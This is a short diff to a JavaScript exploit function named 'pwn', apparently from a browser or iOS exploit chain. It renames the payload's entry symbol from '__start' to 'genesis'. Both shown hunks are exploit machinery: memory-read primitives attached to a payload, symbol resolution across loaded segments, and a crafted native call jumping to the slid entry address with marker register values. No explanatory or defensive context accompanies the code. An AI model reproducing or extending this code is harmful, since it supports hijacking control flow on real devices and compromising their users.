@@ -355,7 +355,7 @@ function pwn() {
     payload.u32 = _u32;
     payload.read = _read;
     payload.readInt64 = _readInt64;
-    var psyms = fsyms(payload, 0, segs, ["__start"]);
+    var psyms = fsyms(payload, 0, segs, ["genesis"]);
     
     ////////////////////////
     var arrsz = 0x100000,
@@ -531,7 +531,7 @@ function pwn() {
         , new Int64(100000) // microseconds
     );
 
-    var jmpAddr = Add(psyms["__start"], shslide);
+    var jmpAddr = Add(psyms["genesis"], shslide);
     add_call(jmpAddr
         , new Int64(0xcafebabe41414140) //x0
         , new Int64(0xcafebabe41414144) //x1
